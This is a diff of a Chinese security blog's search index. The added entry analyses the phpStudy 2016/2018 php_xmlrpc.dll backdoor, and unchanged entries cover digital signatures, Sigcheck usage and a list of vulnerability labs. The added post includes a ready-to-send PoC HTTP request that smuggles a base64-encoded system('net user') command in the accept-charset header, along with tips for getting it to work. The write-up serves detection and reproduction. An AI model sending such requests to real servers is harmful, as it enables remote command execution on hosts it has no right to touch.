@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[phpstudy]]></title>
+    <url>%2Fpost%2F5a5421ee.html</url>
+    <content type="text"></content>
+  </entry>
+  <entry>
     <title><![CDATA[数字签名安全验证]]></title>
     <url>%2Fpost%2Ff1dbfde2.html</url>
     <content type="text"><![CDATA[数字签名安全验证 0x01 数字摘要数字摘要是将任意长度的消息变成固定长度的短消息，它类似于一个自变量是消息的函数，也就是Hash函数。数字摘要就是采用单向Hash函数将需要加密的明文“摘要”成一串固定长度（128位）的密文这一串密文又称为数字指纹，它有固定的长度，而且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。 一个Hash函数的好坏是由发生碰撞的概率决定的。如果攻击者能够轻易地构造出两个消息具有相同的Hash值，那么这样的Hash函数是很危险的。一般来说，安全Hash标准的输出长度为160位，这样才能保证它足够的安全。 这一加密方法亦称安全Hash编码法（SHA:Secure Hash Algorithm）或MD5(MD Standards for Message Digest)，由Ron Rivest所设计。该编码法采用单向Hash函数将需加密的明文“摘要”成一串128bit的密文，这一串密文亦称为数字指纹(Finger Print)，它有固定的长度，且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。这样这摘要便可成为验证明文是否是“真身”的“指纹”了 0x02 数字签名数字签名（又称公钥数字签名）是只有信息的发送者才能产生的别人无法伪造的一段数字串，这段数字串同时也是对信息的发送者发送信息真实性的一个有效证明。它是一种类似写在纸上的普通的物理签名，但是使用了公钥加密领域的技术来实现的，用于鉴别数字信息的方法。一套数字签名通常定义两种互补的运算，一个用于签名，另一个用于验证。数字签名是非对称密钥加密技术与数字摘要技术的应用 0x03 数字签名基本流程（1） 被发送文件用SHA编码加密产生128bit的数字摘要 （2） 发送方用自己的私用密钥 （3） 将原文和加密的摘要同时传给对方。 （4） 对方用发送方的公共密钥对数字签名解密，同时对收到的文件用SHA编码加密产生又一摘要。 （5） 将解密后的摘要和收到的文件在接收方重新加密产生的摘要相互对比。如两者一致，则说明传送过程中信息没有被破坏或篡改过。否则不然。 0x04 数字签名验证检查某些文件的签名是否合法，通过对其数字签名的验证，可以判断文件是否来源可靠以及文件在传输中间是否被篡改 0x05 SigcheckSigcheck是一个命令行实用程序，它显示文件版本号，时间戳信息和数字签名详细信息，包括证书链。 用法：sigcheck [-a] [-h] [-i] [-e] [-l] [-n] [[-s] | [-c | -ct] | [-m]] [-q] [-r] [-u] [-vt] [-v [r] [s]] [-f目录文件] &lt;文件或目录&gt; 用法：sigcheck -d [-c | -ct] &lt;文件或目录&gt; 用法：sigcheck -o [-vt] [-v [r]] &lt;sigcheck csv文件&gt; 用法：sigcheck -t [u] [v] [-i] [-c | -ct] &lt;证书存储名称| *&gt; 参数 描述 -a 显示扩展版本信息。报告的熵度量是文件内容信息的每字节位数。 -c CSV输出，带逗号分隔符 -ct 带有制表符分隔符的CSV输出 -d 转储目录文件的内容 -e 仅扫描可执行映像（无论其扩展名如何） -f 在指定的目录文件中查找签名 -h 显示文件哈希 -i 显示目录名称和签名链 -l 遍历符号链接和目录结点 -m 转储清单 -n 仅显示文件版本号 -o 使用-h选项时，执行Sigcheck先前捕获的CSV文件中捕获的哈希的“病毒总数”查找。此用法用于扫描脱机系统。 -q 安静（无横幅） -r 禁用证书吊销检查 -s 递归子目录 -t [u] [v] 转储指定证书存储区的内容（所有存储区都为“ *”）。 指定-tu以查询用户存储（默认为计算机存储）。 附加“ -v”以使Sigcheck下载受信任的Microsoft根证书列表，并且仅输出未植根于该列表中的证书的有效证书。如果无法访问该站点，则使用当前目录中的authrootstl.cab或authroot.stl（如果存在）。 -u 如果启用了VirusTotal检查，则显示VirusTotal未知或检测到非零的文件，否则仅显示未签名的文件。 -v [rs] 根据文件哈希查询VirusTotal（www.virustotal.com）是否存在恶意软件。 添加“ r”以打开具有非零检测功能的文件的报告。 如果指定了’s’选项，则报告为先前未扫描的文件将上传到VirusTotal。注意扫描结果可能五分钟或更长时间不可用。 -vt 使用VirusTotal功能之前，您必须接受VirusTotal服务条款。请参阅：https : //www.virustotal.com/zh-cn/about/terms-of-service/如果您尚未接受条款，并且省略了此选项，则会提示您互动。 举例：使用该工具的一种方法是使用以下命令检查\ Windows \ System32目录中的未签名文件： sigcheck -u -ec：\ windows \ system32 下载：https://download.sysinternals.com/files/Sigcheck.zip 演示：1.进入sigcheck目录，输入sigcheck 会一个窗口，点击同意即可 2.sigcheck +验证的程序 有签名的 无签名的]]></content>
@@ -19,6 +24,11 @@
     <title><![CDATA[漏洞演练平台汇总]]></title>
     <url>%2Fpost%2Fb6304875.html</url>
     <content type="text"><![CDATA[漏洞演练平台汇总 https://github.com/710leo/ZVulDrill http://www.dvwa.co.uk/ https://sourceforge.net/projects/bwapp/ 个人使用 https://vulhub.org/ 个人使用 https://github.com/adamdoupe/WackoPicko https://github.com/Audi-1/sqli-labs 个人使用 https://github.com/c0ny1/upload-labs http://test.xss.tv/ 建议自己源码搭建，不解释]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[phpstud后门利用和分析]]></title>
+    <url>%2Fpost%2F90ddb320.html</url>
+    <content type="text"><![CDATA[phpstudy后门 0x01 前言 phpstudy是一个php运行环境的集成包，用户不需要去配置运行环境，就可以使用 0x02 问题版本phpStudy2016 ：php-5.2.17、php-5.4.45 phpStudy2018 ：php-5.2.17、php-5.4.45 0x03 排查方法1.问题文件为：php_xmlrpc.dll，在每个php版本目录的ext目录下面都有一个 2.用记事本打开，CTRL+F搜索eval，有%s;@eval(%s('%s')); $V123456789101112131415161718192021![](https://s2.ax1x.com/2019/09/24/ukxPTe.png)## 0x04 后门复现poc: 【poc放出来源**圈子社区**】```httpGET /caijue.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7Accept-Encoding: gzip,deflateCookie: PHPSESSID=fg6b95loelkml2384i5lg7d4l3DNT: 1X-Forwarded-For: 8.8.8.8Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 注意点：Accept-Encoding: gzip,deflate 两种编码方式之间没有空格 ​ accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 执行的命令base64加密 0x05 修复方式等官网发布修复版本吧]]></content>
   </entry>
   <entry>
     <title><![CDATA[Burpsuite Plugin-BurpBounty]]></title>
